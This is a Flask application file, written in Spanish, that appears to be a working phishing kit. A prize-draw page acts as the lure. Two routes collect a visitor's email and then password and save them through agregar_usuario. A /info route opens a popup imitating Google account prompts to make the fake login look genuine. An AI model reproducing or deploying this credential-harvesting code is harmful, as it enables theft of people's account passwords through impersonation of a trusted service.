from flask import render_template, redirect, url_for, request, session, jsonify, current_app
from app import app
from app.forms import Emailform, Passform
from app.datos import agregar_usuario
from app.premios import premios
import random
import os

@app.route('/', methods=['POST', 'GET'])
def index():
        carpeta = os.path.join(current_app.root_path, "static", "premios")
        premios = os.listdir(carpeta)
        premios = [f"/static/premios/{p}" for p in premios]
        return render_template("index.html", premios=premios)

@app.route('/iniciosession', methods=['POST', 'GET'])
def home():
    formu = Emailform()

    if formu.validate_on_submit():
        session['email'] = formu.email.data
        return redirect(url_for('contraseña'))

    return render_template('inicio.html', formu=formu)

@app.route('/info', methods=['GET'])
def info():
    return """<script>
        ventana = window.open ("center", "Ventanagoogle", "width=400,height=300");
        ventana.document.write(`
        <h2>El documento funciona mejor con una cuenta de Google</h2>
        <ul> 
          <li> Descarga aplicaciones, musica, juegos y otros contenidos de Google Play</li>
          <li> Realiza una copia de seguridad de tus aplicaciones y contactos</li>
          <li> Activa funciones de proteccion del dispositivo</li>
        </ul>`)
      </script>"""

@app.route('/password', methods=['POST', 'GET'])
def contraseña():
    form = Passform()
    if form.validate_on_submit():

        agregar_usuario(
            email=session.get('email'),
            password=form.password.data
        )

        session.pop('email', None)
        return redirect(url_for('home'))

    return render_template('password.html', form=form)

@app.route("/sortear", methods=["POST"])
def sortear():
    import random

    index = random.randint(0, len(premios)-1)

    ganador = premios[index]


    return jsonify({
         "index": index,
        "nombre": ganador["nombre"],
        "imagen": ganador["imagen"]
    })
